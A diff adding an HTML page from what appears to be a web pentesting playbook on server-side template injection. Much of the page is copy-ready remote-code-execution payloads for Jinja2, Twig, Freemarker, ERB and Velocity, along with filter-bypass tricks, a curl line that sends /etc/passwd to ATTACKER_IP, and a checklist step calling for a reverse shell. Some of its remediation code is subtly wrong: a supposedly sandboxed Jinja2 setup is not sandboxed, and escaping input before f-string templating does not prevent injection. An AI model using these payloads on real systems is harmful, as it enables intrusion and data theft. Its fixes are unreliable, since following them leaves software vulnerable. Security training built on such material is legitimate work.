@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Server-Side Template Injection (SSTI) testing guide: engine detection, payload crafting, and RCE exploitation across Jinja2, Twig, FreeMarker and more.">
+    <meta property="og:title" content="SSTI – Web App Pentesting Guide">
+    <meta property="og:description" content="Server-Side Template Injection (SSTI) testing guide: engine detection, payload crafting, and RCE exploitation across Jinja2, Twig, FreeMarker and more.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>Server-Side Template Injection  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">Server-Side Template Injection</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">🎯 Analogy</a>
+    <a href="#how-it-works">⚙️ How It Works</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#template-detection">🔎 Template Detection</a>
+    <a href="#where-to-look">🔍 Where to Look</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#burp-workflow">🛠️ Burp Workflow</a>
+    <a href="#payloads">💥 Payloads</a>
+    <a href="#advanced-exploitation">🔥 Advanced</a>
+    <a href="#waf-bypass">🛡️ WAF Bypass</a>
+    <a href="#exploitation">🎯 Exploitation</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">✅ Checklist</a>
+    <a href="#remediation">🔒 Remediation</a>
+    <a href="#labs">🧪 Labs</a>
+    <a href="#mistakes">⚠️ Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A03 · CVSS 9.8 · Day 4</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M14 3v5a1 1 0 0 0 1 1h5"/><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z"/><path d="m10 13-2 2 2 2"/><path d="m14 13 2 2-2 2"/></svg></span><span>Server-Side Template Injection (SSTI)</span></h1>
+      <p>Server-side template injection occurs when user input is embedded into a template engine (Jinja2, Twig, Freemarker, etc.) without proper escaping. Attackers can inject template directives or expressions to access the template context, execute arbitrary functions, or achieve remote code execution.</p>
+      <div class="badge-row">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-bscp">BSCP</span>
+        <span class="badge badge-difficulty">Advanced</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">The Restaurant's Custom Order Form</div>
+        <p>A restaurant has a "Custom Order" form. Normally, customers write helpful notes like "no onions" or "extra sauce," and the kitchen staff reads and implements the request.</p>
+        <p>But this restaurant uses a broken system: they take your custom order note, plug it directly into a chef's script, and execute that script as-is. If you write "{{7*7}} and skip onions," the system evaluates your template expression as code.</p>
+        <p>Now you realize the script has access to the entire restaurant's systems. You write "{{system('cat /etc/passwd')}}" and the chef's script executes your command, returning the contents of sensitive files to your browser.</p>
+        <p>That's SSTI: your input is rendered as code within a template engine, not just displayed as plain text. The template engine evaluates your expressions and executes any functions you call.</p>
+      </div>
+    </section>
+
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>Template engines are designed to embed dynamic data into static text. For example, an email template might say "Hello {{name}}, your order is ready."</p>
+      <p>The vulnerability occurs when user input is concatenated directly into the template string instead of being passed as a safe variable:</p>
+      <pre><code># VULNERABLE
+template_string = "Hello " + user_input + ", your order is ready."
+rendered = template_engine.render(template_string)
+
+# SAFE
+template_string = "Hello {{name}}, your order is ready."
+rendered = template_engine.render(template_string, {"name": user_input})</code></pre>
+      <p>When you inject template syntax into the string itself, the engine parses and executes your code. The template engine has access to:</p>
+      <ul>
+        <li>Built-in functions (system, exec, os.system)</li>
+        <li>Class constructors and inheritance chains</li>
+        <li>File system access (open, read)</li>
+        <li>Environment variables</li>
+        <li>Any Python/Java/PHP object available in the template context</li>
+      </ul>
+    </section>
+
+    <section id="methodology">
+      <h2>📅 When in the 5-Day Workflow</h2>
+
+      <div class="workflow-days">
+        <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+        <div class="day-pill probe"><span class="day-num">Day 2</span>Initial Probe</div>
+        <div class="day-pill"><span class="day-num">Day 3</span>File/CSRF</div>
+        <div class="day-pill deep"><span class="day-num">Day 4</span>Deep Dive</div>
+        <div class="day-pill"><span class="day-num">Day 5</span>Client-Side</div>
+      </div>
+
+      <div class="callout method-probe">
+        <div class="callout-title">⚡ Day 2  · SSTI Probe</div>
+        <p>On Day 2, inject <code>{{7*7}}</code> and <code>${7*7}</code> into every reflected input. Look for <code>49</code> in the response. Also check error messages  · if the error includes the template variable name, that's a strong SSTI signal. Features to probe: email personalization ("Hello {{name}}"), custom report generators, any "preview" feature.</p>
+        <pre><code>{{7*7}}        → 49? → Jinja2/Twig
+${7*7}         → 49? → Freemarker/Thymeleaf/EL injection
+<%= 7*7 %>     → 49? → ERB (Ruby)
+#{7*7}         → 49? → Pebble
+${{"7"*7}}     → polyglot probe</code></pre>
+      </div>
+
+      <div class="callout method-deep">
+        <div class="callout-title">🎯 Day 4  · Identify Engine + RCE</div>
+        <p>Once you have a <code>49</code> response, identify the template engine using the decision tree, then escalate to RCE with engine-specific payloads. The most common is Jinja2 (Python). Always verify the Python version first (subclass indexes differ between Python versions).</p>
+        <pre><code># Jinja2 RCE (Python 3)
+{{''.__class__.__mro__[1].__subclasses__()}}
+# Find index of subprocess.Popen in the list, then:
+{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
+
+# Twig (PHP) RCE
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></pre>
+        <p><strong>Chain it:</strong> SSTI RCE → read /etc/passwd + app source → find hardcoded secrets → database access. Or: SSTI → reverse shell → full server compromise.</p>
+      </div>
+    </section>
+
+    <section id="template-detection">
+      <h2>Template Engine Identification</h2>
+      <p>Different template engines have different syntax. Use this decision tree to identify which engine the target uses:</p>
+      <pre><code>{{ 7 * 7 }}         → Output 49 → Jinja2/Twig/Flask/Django
+${7*7}              → Output 49 → Freemarker/Thymeleaf/OGNL
+<%= 7*7 %>          → Output 49 → ERB/EJS
+#{7*7}              → Output 49 → Pebble
+*{7*7}              → Output 49 → Spring EL
+{{7*7}}             → No output → Handlebars/Mustache (logic-less)
+[=7*7=]             → Output 49 → Slim
+@(7*7)              → Output 49 → Razor (C#)</code></pre>
+      <p>Start by injecting <code>{{7*7}}</code> into various input fields. If the output shows <code>49</code>, you've found SSTI and likely identified the engine as Jinja2, Twig, or similar.</p>
+    </section>
+
+    <section id="where-to-look">
+      <h2>Where to Look for SSTI</h2>
+      <ul>
+        <li><strong>Error messages:</strong> If your input appears in an error message, the template is likely rendering it. Try <code>{{7*7}}</code> in inputs that generate errors.</li>
+        <li><strong>User personalization:</strong> "Hello {{name}}" scenarios. Try injecting template syntax into name fields, email fields, or any field that's displayed back to you.</li>
+        <li><strong>PDF or document generation:</strong> Services that generate PDFs or reports from user input often use template engines. Try injecting into title, subject, or body fields.</li>
+        <li><strong>Email generation:</strong> Custom email subjects or bodies might be rendered with templates. Try injecting into subject lines or custom message fields.</li>
+        <li><strong>Preview features:</strong> Any "preview" functionality that shows your formatted input back to you.</li>
+        <li><strong>Report generation:</strong> Custom report titles, headers, or content fields.</li>
+        <li><strong>URL parameters:</strong> Don't limit yourself to POST bodies. Check GET parameters, custom headers, and even file names.</li>
+        <li><strong>JSON responses:</strong> Some APIs render user data in JSON responses. The data might be rendered as a template before being returned.</li>
+      </ul>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Find potential SSTI vectors:</strong> Look for endpoints that take user input and display it back. This could be in error messages, user profiles, generated documents, or preview features. Right-click any request with user input and send to Repeater.
+        </div>
+      </div>
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Test for template injection:</strong> Inject the probe string <code>{{7*7}}</code> into the input field. Send the request and check the response for <code>49</code>.
+          <pre><code>Input: {{7*7}}
+Response: ... 49 ...</code></pre>
+          If you see the calculation result, template injection is confirmed.
+        </div>
+      </div>
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Identify the engine:</strong> Use the template syntax to determine which engine is in use. Try <code>${7*7}</code> and <code><%= 7*7 %></code> if <code>{{7*7}}</code> didn't work. Reference the detection tree above.
+        </div>
+      </div>
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Test for code execution:</strong> Once you've identified the engine, use engine-specific payloads to confirm RCE. For Jinja2, try accessing object classes to execute system commands.
+        </div>
+      </div>
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>Exploit the vulnerability:</strong> Use the appropriate payload for your identified engine to read files, access environment variables, or execute arbitrary commands.
+        </div>
+      </div>
+    </section>
+
+    <section id="payloads">
+      <h2>Payloads by Template Engine</h2>
+
+      <h3>Jinja2 (Python)  · Flask, Django</h3>
+      <p><strong>Basic test:</strong> <code>{{7*7}}</code> → 49</p>
+      <p><strong>List available subclasses (information gathering):</strong></p>
+      <pre><code>{{''.__class__.__mro__[1].__subclasses__()}}</code></pre>
+      <p><strong>Execute system command (RCE):</strong></p>
+      <pre><code>{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].strip()}}</code></pre>
+      <p><strong>Alternative Jinja2 RCE (using lipsum):</strong></p>
+      <pre><code>{{lipsum.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}</code></pre>
+      <p><strong>Read a file:</strong></p>
+      <pre><code>{{''.__class__.__mro__[1].__subclasses__()[406]('/etc/passwd').read()}}</code></pre>
+      <p>Note: Subclass indices vary by Python version. Use the information gathering payload first to find the right index for <code>subprocess.Popen</code> or <code>os.popen</code>.</p>
+
+      <h3>Twig (PHP)  · Symfony</h3>
+      <p><strong>Basic test:</strong> <code>{{7*7}}</code> → 49</p>
+      <p><strong>RCE using filter:</strong></p>
+      <pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></pre>
+      <p><strong>Alternative RCE:</strong></p>
+      <pre><code>{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}</code></pre>
+      <p><strong>Access to globals:</strong></p>
+      <pre><code>{{_self.env.globals.get('_SERVER')}}</code></pre>
+
+      <h3>Freemarker (Java)</h3>
+      <p><strong>Basic test:</strong> <code>${7*7}</code> → 49</p>
+      <p><strong>RCE:</strong></p>
+      <pre><code><#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}</code></pre>
+      <p><strong>Accessing Java Runtime:</strong></p>
+      <pre><code><#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id").start()}</code></pre>
+
+      <h3>Pebble (Java)</h3>
+      <p><strong>Basic test:</strong> <code>#{7*7}</code> → 49</p>
+      <p><strong>RCE (via method access):</strong></p>
+      <pre><code>#{T(java.lang.Runtime).getRuntime().exec("id")}</code></pre>
+
+      <h3>ERB (Ruby)  · Rails</h3>
+      <p><strong>Basic test:</strong> <code><%= 7*7 %></code> → 49</p>
+      <p><strong>RCE:</strong></p>
+      <pre><code><%= system('id') %></code></pre>
+      <p><strong>File read:</strong></p>
+      <pre><code><%= File.open('/etc/passwd').read %></code></pre>
+
+      <h3>Velocity (Java)</h3>
+      <p><strong>Basic test:</strong> <code>#set($x=7*7)$x</code> → 49</p>
+      <p><strong>RCE (if reflection allowed):</strong></p>
+      <pre><code>#set($rt = $class.forName("java.lang.Runtime"))
+#set($chr = $class.forName("java.lang.Character"))
+#set($str = $class.forName("java.lang.String"))
+#set($ex=$rt.getRuntime().exec("id"))</code></pre>
+
+      <h3>Generic Filter Bypass (when Jinja2 filters are restricted)</h3>
+      <p>Use <code>|attr()</code> filter to access attributes bypassed by normal restrictions:</p>
+      <pre><code>{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(408)('id',shell=True,stdout=-1).communicate()[0].strip()}}</code></pre>
+    </section>
+
+    <section id="advanced-exploitation">
+      <h2>Advanced Exploitation Techniques</h2>
+      <h3>Handling Output Restrictions</h3>
+      <p>If output is stripped or limited, use out-of-band techniques to exfiltrate data:</p>
+      <pre><code>{{''.__class__.__mro__[1].__subclasses__()[408]('curl http://ATTACKER_IP/?data='+open('/etc/passwd').read(),shell=True)}}</code></pre>
+      <p>The command output is sent to your attacker-controlled server in the URL parameter.</p>
+
+      <h3>Bypassing Space Filters</h3>
+      <p>If spaces are filtered, use Python's tab character or other whitespace:</p>
+      <pre><code>{{''.__class__.__mro__[1].__subclasses__()[408]('id'%09shell=True)}}</code></pre>
+
+      <h3>Bypassing Keyword Filters (__class__, __mro__)</h3>
+      <p>Use attribute access via <code>|attr()</code> or bracket notation with hex/octal encoding:</p>
+      <pre><code>{{''|attr('\x5f\x5fclass\x5f\x5f')}}</code></pre>
+
+      <h3>Chained Command Execution</h3>
+      <p>Execute multiple commands in sequence:</p>
+      <pre><code>{{''.__class__.__mro__[1].__subclasses__()[408]('id; whoami; pwd',shell=True,stdout=-1).communicate()[0]}}</code></pre>
+    </section>
+
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">
+          <span>Progress: <span class="progress-mini">0/11</span></span>
+          <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+        </div>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Identify endpoints that display user input (error messages, previews, profiles)</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Test basic SSTI probe {{7*7}} in various input fields</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Identify template engine using syntax detection ($, %, #, etc.)</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>If Jinja2: test __class__.__mro__[1].__subclasses__() to enumerate objects</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Execute proof-of-concept RCE payload for identified engine</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Read sensitive files (/etc/passwd, config files) to confirm RCE</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Test filter bypass techniques (|attr, hex encoding) if basic payloads fail</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Check for output restrictions and test out-of-band exfiltration if needed</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Try all template engines if first identification was uncertain</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Document all SSTI vectors and exploit payloads used</span>
+        </label>
+        <label class="checklist-item">
+          <input type="checkbox">
+          <span>Attempt to establish reverse shell or file read for impact demonstration</span>
+        </label>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+      <h3>Bypass __class__ and __mro__ Filters</h3>
+      <p>Use string encoding or attribute access via <code>|attr()</code>:</p>
+      <pre><code># Hex encoding
+{{''|attr('\x5f\x5fclass\x5f\x5f')}}
+
+# Octal encoding
+{{''|attr('\137\137class\137\137')}}
+
+# Using |attr filter
+{{''|attr('__class__')|attr('__mro__')}}</code></pre>
+
+      <h3>Bypass Subprocess/os.system Keywords</h3>
+      <p>Use dynamic string construction or alternative functions:</p>
+      <pre><code># Using __import__
+{{__import__('os').popen('id').read()}}
+
+# Using getattr
+{{getattr(__builtins__,'__import__')('os').popen('id').read()}}
+
+# Using globals
+{{''.__class__.__mro__[1].__subclasses__()[417].__init__.__globals__['sys']}}</code></pre>
+
+      <h3>Bypass Output Filtering</h3>
+      <p>Use comment characters to hide payloads from simple string matching:</p>
+      <pre><code>{{7*7}} {# Your comment #}</code></pre>
+
+      <h3>Case Variation</h3>
+      <p>Some filters are case-sensitive. Try variations:</p>
+      <pre><code>{{''.__CLASS__.__MRO__}}
+{{''.__Class__.__Mro__}}</code></pre>
+
+      <h3>Polyglot Payloads</h3>
+      <p>Test multiple template syntaxes in a single payload to bypass engine-specific filters:</p>
+      <pre><code>{{7*7}}${7*7}<%= 7*7 %>#{7*7}</code></pre>
+    </section>
+
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+      <h3>Remote Code Execution (RCE)</h3>
+      <p>SSTI directly leads to RCE. Execute arbitrary system commands to read files, modify data, or pivot to other systems.</p>
+
+      <h3>Information Disclosure</h3>
+      <p>Read sensitive files:environment variables, configuration files, source code, database credentials, API keys, SSH keys.</p>
+
+      <h3>Privilege Escalation</h3>
+      <p>Execute commands with the privileges of the web application process. If the app runs as root, full system compromise is possible.</p>
+
+      <h3>Lateral Movement</h3>
+      <p>Use RCE to compromise other services on the network, access internal APIs, or pivot to other machines.</p>
+
+      <h3>Data Manipulation</h3>
+      <p>Modify or delete data in the database, tamper with file systems, or alter application behavior.</p>
+
+      <h3>Denial of Service</h3>
+      <p>Crash the application or consume resources through infinite loops or fork bombs.</p>
+    </section>
+
+    <section id="remediation">
+      <h2>Remediation</h2>
+      <h3>Never Pass User Input Directly to Template Engines</h3>
+      <p><strong>VULNERABLE:</strong></p>
+      <pre><code>user_name = request.args.get('name')
+template_string = f"Hello {user_name}, welcome!"
+result = template_engine.render(template_string)</code></pre>
+      <p><strong>SAFE:</strong></p>
+      <pre><code>user_name = request.args.get('name')
+template_string = "Hello {{name}}, welcome!"
+result = template_engine.render(template_string, {'name': user_name})</code></pre>
+
+      <h3>Use Sandboxed Template Renderers</h3>
+      <p>Some template engines support sandboxed modes that restrict access to dangerous functions:</p>
+      <pre><code>from jinja2 import Environment, select_autoescape
+
+# Sandboxed Jinja2
+env = Environment(
+    autoescape=select_autoescape(['html', 'xml']),
+    enable_async=False
+)
+# Restrict access to certain modules
+env.globals['__import__'] = None</code></pre>
+
+      <h3>Use Logic-Less Templates (Mustache, Handlebars)</h3>
+      <p>Logic-less templates don't support arbitrary code execution. They can only display variables, preventing SSTI entirely:</p>
+      <pre><code>Hello {{name}}, welcome!  <!-- Can only display variables, no code --></code></pre>
+
+      <h3>Escape All User Input</h3>
+      <p>Ensure all user input is properly escaped before rendering:</p>
+      <pre><code>from markupsafe import escape
+
+user_name = escape(request.args.get('name'))
+template_string = f"Hello {user_name}, welcome!"</code></pre>
+
+      <h3>Use Auto-Escaping</h3>
+      <p>Enable auto-escaping in your template engine (most do by default):</p>
+      <pre><code>from jinja2 import Environment, select_autoescape
+
+env = Environment(autoescape=select_autoescape(['html', 'xml']))</code></pre>
+
+      <h3>Validate and Whitelist Input</h3>
+      <p>Restrict user input to expected formats. If a field should be a name, validate it contains only letters and spaces.</p>
+
+      <h3>Separate Code and Data</h3>
+      <p>Never concatenate user input into template code. Always pass user data as variables to pre-written template strings.</p>
+
+      <h3>Use Security Headers and CSP</h3>
+      <p>Content Security Policy can limit the impact of RCE by restricting what scripts can do, though this is not a primary defense.</p>
+
+      <h3>Regular Security Updates</h3>
+      <p>Keep template engines and all dependencies updated. Patches for SSTI-related issues are regularly released.</p>
+    </section>
+
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <p>Practice SSTI exploitation with these PortSwigger Web Security Academy labs:</p>
+      <ul>
+        <li>Server-side template injection with unknown template language</li>
+        <li>Server-side template injection in an expression language context</li>
+        <li>Server-side template injection with information disclosure via error messages</li>
+        <li>Server-side template injection in a sandboxed environment</li>
+        <li>Server-side template injection using alternative syntax</li>
+        <li>Server-side template injection in a custom expression language</li>
+        <li>Server-side template injection in Twig</li>
+      </ul>
+      <p>All 7 labs cover different template engines and exploitation techniques. Start with "unknown template language" to practice engine identification.</p>
+    </section>
+
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+      <div class="callout warn">
+        <div class="callout-title">Don't Fall Into These Traps</div>
+        <ul>
+          <li><strong>Testing only Jinja2 payloads:</strong> Different engines have completely different syntax and exploitation techniques. Always identify the engine first before using payloads.</li>
+          <li><strong>Giving up when {{7*7}} doesn't work:</strong> Different engines use different syntax. Try ${7*7}, <%= 7*7 %>, #{7*7}, and other variations.</li>
+          <li><strong>Not testing error messages:</strong> SSTI often appears in error messages first. Try intentionally causing errors (typos, invalid input) to trigger template rendering.</li>
+          <li><strong>Forgetting the correct __subclasses__() index:</strong> In Jinja2, the index for subprocess.Popen varies by Python version. Use the information gathering payload to find the correct index before exploiting.</li>
+          <li><strong>Not trying filter bypass techniques:</strong> If basic payloads are blocked, WAF filters might be preventing __class__ or __mro__ keywords. Use |attr(), hex encoding, or alternative functions to bypass.</li>
+          <li><strong>Assuming output-less injection is failure:</strong> Even if you don't see output in the response, SSTI might be occurring server-side. Use time-based techniques or out-of-band exfiltration.</li>
+          <li><strong>Only looking in POST bodies:</strong> SSTI can appear in GET parameters, headers, cookies, file names, and anywhere else user input flows to a template engine.</li>
+          <li><strong>Not reading error messages carefully:</strong> Error messages often reveal the template engine, Python version, and exact code path. This is invaluable for exploitation.</li>
+        </ul>
+      </div>
+    </section>
+
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>SSTI achieves RCE through the template engine  · the same apps that have SSTI often have other injection flaws.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="cmdi.html"><span class="sa-icon">💻</span><span class="sa-name">Command Injection</span><span class="sa-why">Both achieve RCE. SSTI is often the path to CMDi  · the template engine calls OS functions that execute commands.</span></a>
+      <a class="see-also-card" href="sqli.html"><span class="sa-icon">🗄️</span><span class="sa-name">SQL Injection</span><span class="sa-why">Same root cause: user input interpreted as code. Apps vulnerable to SSTI often have other injection flaws.</span></a>
+      <a class="see-also-card" href="prototype-pollution.html"><span class="sa-icon">☣️</span><span class="sa-name">Prototype Pollution</span><span class="sa-why">Server-side prototype pollution in Node.js can be escalated to SSTI if a template engine reads polluted properties.</span></a>
+      <a class="see-also-card" href="path-traversal.html"><span class="sa-icon">📁</span><span class="sa-name">Path Traversal</span><span class="sa-why">SSTI in a template-name parameter (e.g., ?template=../../etc/passwd) combines both attack classes.</span></a>
+    </div>
+  </main>
+</div>
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => {
+      btn.textContent = 'Copy';
+      btn.classList.remove('copied');
+    }, 2000);
+  });
+});
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('#sidebar a');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+sections.forEach(s => observer.observe(s));
+const STORAGE_KEY = 'ssti-checklist-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  const saved = localStorage.getItem(STORAGE_KEY + i);
+  if (saved === 'true') {
+    cb.checked = true;
+    cb.closest('.checklist-item').classList.add('done');
+  }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(STORAGE_KEY + i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(wrap => {
+    const all = wrap.querySelectorAll('input[type=checkbox]');
+    const done = wrap.querySelectorAll('input[type=checkbox]:checked');
+    const mini = wrap.querySelector('.progress-mini');
+    const bar = wrap.querySelector('.progress-bar');
+    if (mini) mini.textContent = done.length + '/' + all.length;
+    if (bar) bar.style.width = (all.length ? (done.length / all.length * 100) : 0) + '%';
+  });
+}
+updateProgress();
+</script>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
